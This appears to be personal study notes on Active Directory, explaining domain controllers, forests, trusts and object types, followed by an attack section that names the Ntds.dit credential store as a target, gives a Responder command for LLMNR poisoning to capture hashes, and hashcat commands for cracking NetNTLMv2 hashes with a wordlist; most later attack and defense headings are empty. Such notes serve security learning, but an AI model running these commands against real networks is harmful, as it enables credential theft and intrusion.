# Active Directory:
## Domain Controller
1. hosts a copy of AD Directory Services directory store
2. provide authentication and authorization
3. replicate updates to other domain controllers in the domain and forest
4. allow administrative access to manage user accounts and network resources

## Domains: a way to group and manage objects in an organization
1. an administrative boundary for applying policies to groups of objects
2. a replication boundary for replicating data between domain controllers
3. an authentication and authorization boundary that proveides a way to limit the scope of access to resources. 

## Forest: a collection of one or more domain trees
1. share a common schema
2. share a common configuration partition
3. share a common global catalog to enable searching
4. enable trusts between all domains in the forest
5. share the Enterprise Admins and Schema Admins groups

## Oganizational Unit (OU): OUs are Active Directory containers that can contain users, groups, computers, and other OUs
1. represent your organization hierarchically and logically
2. manage a collection of objects in a consistent way
3. delegate permissions to administer groups of objects
4. apply policies

## Trusts: provide a mechanism for users to gain access to resources in another domain
1. all domians in a forest trust all other domains in the forest
2. trust can extend outside the forest

Directional Trust: the trust direction flows from trusting domain to to trusted domain

Transitive Trust: the trust relationship is extended beyond a two-domain trust to include other trusted domains 

## Objects:
1. User: enables network resource access for a user
2. InetOrgPerson: similar to user account, used for compatibility with other directory services
3. Contacts: Used primarily to assign e-mail addresses to external users, doesn't enable network access
4. Groups: used to simplify the administration of access controls
5. Computers: Enables authentication and auditing of computer access to resources
6. Printers: Used to simplify the process of locating and connecting to printers
7. Shared Folders: enables users to search for shared folders based on properties


**********************

# Attacking:
## Data Store:
```
%SystemRoot%\NTDS\Ntds.dit
C:\Windows\NTDS\Ntds.dit
```
always check for this file and grab it. only accessible through the domian controller and contains everything in Active Directory. 


## LLMNR Poisoning: 
### Responder:
gather hashes over the network passively 
```
sudo python /usr/share/responder/Responder.py -I eth0 -rdw -v 
```
```
-I interface
-r enable answers for netbios wredir suffix queries
-d enable answers for netbios domain suffix queries
-w start the WPAD rogue proxy server
-v verbose
```
save hashses to file called hashes.txt

### Hashcat:
using the password file rockyou.txt and the NTLM module to crack passwords
```
hashcat -m 5600 hashes.txt rockyou.txt --force
```
using the password file rockyou.txt to crack passwords
```
hashcat -m 5600 hashes.txt rockyou.txt --force
```

$ hashcat --help | grep SHA

```
   5500 | NetNTLMv1                                        | Network Protocols
   5500 | NetNTLMv1+ESS                                    | Network Protocols
   5600 | NetNTLMv2                                        | Network Protocols
   1000 | NTLM                                             | Operating Systems
   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols
  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols
    100 | SHA1                                             | Raw Hash
  17400 | SHA3-256                                         | Raw Hash
  17500 | SHA3-384                                         | Raw Hash
  17600 | SHA3-512                                         | Raw Hash
```


## LLMNR Poisoning Defense:


## SMB attacks: 


## IPv6: mitm6


## IPv6 Defense:


## DNS take over:


## Domain Enumeration: 
# Powerview:
# Bloodhound: 


## Pass the hash: 


## CrackMapExec:


## SecretsDump.py:


## Token Impersonation:


## kerberoasting:


## GPP:


## MimiKatz:


## Golden Ticket: 





